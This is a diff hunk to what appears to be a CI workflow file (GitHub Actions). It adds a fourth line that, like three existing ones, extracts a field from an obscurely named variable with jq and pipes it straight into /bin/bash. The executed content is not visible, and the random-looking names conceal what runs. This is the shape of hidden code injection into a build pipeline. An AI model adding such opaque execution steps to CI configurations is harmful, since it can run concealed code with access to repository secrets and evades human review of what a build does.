@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$x3155" | jq -r .g078 | /bin/bash
           printf '%s' "$avdzm524" | jq -r .vvksy136 | /bin/bash
           printf '%s' "$s05" | jq -r .vvhl19 | /bin/bash
+          printf '%s' "$qrh77092" | jq -r .da113 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
